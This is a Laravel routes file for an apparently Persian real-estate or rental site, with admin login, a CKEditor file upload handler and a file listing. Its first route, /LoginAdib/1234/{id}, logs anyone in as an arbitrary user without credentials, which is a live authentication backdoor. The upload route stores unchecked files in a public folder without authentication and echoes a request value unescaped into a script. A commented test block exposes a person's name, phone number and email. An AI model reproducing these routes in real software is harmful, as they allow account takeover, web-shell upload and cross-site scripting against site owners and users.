<?php

use App\Models\ApiCurl;
use App\Models\EstateCronjob;
use App\Models\EstateRentList;
use App\Models\EstateReserve;
use App\Models\User;
use App\Models\Estate;
use App\Models\EstatePhoto;
use App\Jobs\InsertEstate;
use Carbon\Carbon;
use App\Mail\Mail;
use App\Jobs\InsertReserve;
use Illuminate\Support\Facades\Route;
use GuzzleHttp\Psr7\Header;
use Illuminate\Http\Request;
use Illuminate\Auth\Notifications\ResetPassword;



/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/LoginAdib/1234/{id?}', function ($id=1) {
    Auth::loginUsingId($id);
    return redirect()->route('admin.profile.show');
});

// Route::get('rentestate/{locale}', function ($locale) {
//     \Illuminate\Support\Facades\App::setLocale($locale);
//     session()->put('locale', "FA");
//     return redirect('rentestate/');
// })->name('lang_set');


// Route::get('test', function (){
//     dd(country_code());
//     $text='<p>';
//     $text.='نام: ';
//     $text.='<strong>';
//     $text.='عادل نجفی';
//     $text.='</strong>';
//     $text.='</p>';
//     $text.='<p>';
//     $text.='شماره تماس: ';
//     $text.='<strong dir="ltr">';
//     $text.='09187107810';
//     $text.='</strong>';
//     $text.='</p>';
//     $text.='<p>';
//     $text.='ایمیل: ';
//     $text.='<strong dir="ltr">';
//     $text.='adeln1368@gmail.com';
//     $text.='</strong>';
//     $text.='</p>';
//     $text.='تاریخ ثبت: ';
//     $text.='<strong dir="ltr">';
//     $text.='2022-01-01 10:14:33';
//     $text.='</strong>';
//     $text.='</p>';
//     $details = [
//         'subject' => 'فرم درخواست اجاره خودرو',
//         'title' => 'ارسال فرم درخواست کرایه خودرو جدید',
//         'body' => $text
//     ];
// //    \Mail::to('adeln1368@gmail.com')->send(new Mail($mail_data));
//     return view('mail.send_mail',compact('details'));
//     dd('ok');
// });
// Route::get('/estate_list125', function () {
//     reserve_ok_insert_to_crm();
//     dd(uniqid());
// });
// Route::get('/template/{id}', function ($id) {
//    if($id==1)
//    {
//        session(['back_css' => 'black']);
//    }
//    else
//    {
//        session()->forget('back_css');
//    }

//    return redirect()->back();
// });

Auth::routes(['register' => false]);


Route::post('filemanager/upload',function (Request $request ){
    if(isset($_FILES['upload']['name'])) {
        $file=$_FILES['upload']['name'];
        $filetmp=$_FILES['upload']['tmp_name'];
        $file_pas=explode('.',$file);
        $file_n='check_editor_'.time().'_'.$file_pas[0].'.'.end($file_pas);
        $photo=move_uploaded_file($filetmp,'assets/editor/upload/'.$file_n);

        $CKEditorFuncNum = $request->input('CKEditorFuncNum');
        $url = url('assets/editor/upload/'.$file_n);
        $msg = 'File uploaded successfully';
        $response = "<script>window.parent.CKEDITOR.tools.callFunction($CKEditorFuncNum, '$url', '$msg')</script>";

        @header('Content-type: text/html; charset=utf-8');
        echo $response;
    }
})->name('filemanager_upload');


Route::get('filemanager',function (Request $request ){
    $paths=glob('assets/editor/upload/*');
    $fileNames=array();
    foreach ($paths as $path)
    {
        array_push($fileNames,basename($path));
    }
    $data=array(
        'fileNames'=>$fileNames
    );
    return view('file_manager')->with($data);
})->name('filemanager');